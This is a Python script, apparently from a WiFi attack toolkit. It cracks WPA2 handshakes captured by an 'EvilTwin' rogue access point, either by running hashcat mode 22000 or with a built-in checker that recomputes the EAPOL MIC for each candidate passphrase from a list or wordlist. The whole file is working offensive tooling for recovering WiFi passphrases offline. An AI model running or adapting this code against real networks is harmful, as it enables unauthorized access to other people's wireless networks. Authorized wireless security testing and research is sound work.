"""Crack (or verify) a captured .hc22000 file.

Prefers hashcat -m 22000 when it's on PATH; otherwise runs a built-in WPA*02 verifier that
recomputes the EAPOL MIC per candidate PSK (the same KDF the live 4-way validates). Either way
the point is to prove a captured EvilTwin handshake really recovers the passphrase offline.

  uv run python scripts/ap/crack.py --hashfile eviltwin.hc22000 --psk <candidate> [--psk ...]
  uv run python scripts/ap/crack.py --hashfile eviltwin.hc22000 --wordlist words.txt

Output prefixes: [+] cracked   [*] step   [-] a problem.
"""
import argparse
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:                                                 # noqa: BLE001
    pass

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent / "src"))

from wifit3.crack import wpa_psk


def _candidates(a) -> list[str]:
    words = list(a.psk)
    if a.wordlist:
        words += [w.strip() for w in Path(a.wordlist).read_text(encoding="utf-8").splitlines() if w.strip()]
    return words


def _verify_line(line: str, words: list[str]) -> tuple[str, str] | None:
    """Return (ssid, psk) if a candidate reproduces this WPA*02 line's MIC, else None."""
    parts = line.strip().split("*")
    if len(parts) < 9 or parts[0] != "WPA" or parts[1] != "02":
        return None
    mic_target, mac_ap, mac_sta, essid_hex, anonce_hex, eapol_hex = parts[2:8]
    ssid = bytes.fromhex(essid_hex).decode("utf-8", "replace")
    aa, spa = bytes.fromhex(mac_ap), bytes.fromhex(mac_sta)
    anonce, eapol = bytes.fromhex(anonce_hex), bytes.fromhex(eapol_hex)
    snonce = eapol[17:49]
    for psk in words:
        if wpa_psk.mic_for(psk, ssid, aa, spa, anonce, snonce, eapol).hex() == mic_target.lower():
            return ssid, psk
    return None


def _run_internal(hashfile: Path, words: list[str]) -> int:
    lines = [ln for ln in hashfile.read_text(encoding="utf-8").splitlines() if ln.strip()]
    wpa02 = [ln for ln in lines if ln.split("*")[:2] == ["WPA", "02"]]
    if not wpa02:
        print(f"[-] no WPA*02 (EAPOL) lines in {hashfile} (found {len(lines)} line(s))")
        return 1
    print(f"[*] internal verifier: {len(wpa02)} handshake(s), {len(words)} candidate(s)")
    cracked = 0
    for ln in wpa02:
        hit = _verify_line(ln, words)
        if hit:
            cracked += 1
            print(f"[+] cracked: SSID '{hit[0]}'  PSK '{hit[1]}'")
        else:
            print(f"[-] no candidate matched: {ln.split('*')[3]} <-> {ln.split('*')[4]}")
    return 0 if cracked else 2


def _run_hashcat(tool: str, hashfile: Path, words: list[str]) -> int:
    with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False, encoding="utf-8") as fh:
        fh.write("\n".join(words) + "\n")
        wl = fh.name
    cmd = [tool, "-m", "22000", "-a", "0", str(hashfile), wl, "--potfile-disable", "--quiet"]
    print(f"[*] {' '.join(cmd)}")
    proc = subprocess.run(cmd, capture_output=True, text=True)
    sys.stdout.write(proc.stdout)
    if proc.stderr.strip():
        sys.stdout.write(proc.stderr)
    return proc.returncode


def main() -> int:
    p = argparse.ArgumentParser(description="Crack/verify a captured .hc22000")
    p.add_argument("--hashfile", default=str(Path(tempfile.gettempdir()) / "eviltwin.hc22000"))
    p.add_argument("--psk", action="append", default=[], help="a candidate passphrase (repeatable)")
    p.add_argument("--wordlist", default="", help="newline-delimited candidate file")
    p.add_argument("--internal", action="store_true", help="force the built-in verifier")
    a = p.parse_args()

    hashfile = Path(a.hashfile)
    if not hashfile.exists():
        print(f"[-] no such hashfile: {hashfile}")
        return 1
    words = _candidates(a)
    if not words:
        print("[-] give at least one --psk or a --wordlist")
        return 1

    tool = None if a.internal else (shutil.which("hashcat") or shutil.which("aircrack-ng"))
    if tool:
        return _run_hashcat(tool, hashfile, words)
    print("[*] no external cracker on PATH; using the built-in WPA*02 verifier")
    return _run_internal(hashfile, words)


if __name__ == "__main__":
    raise SystemExit(main())
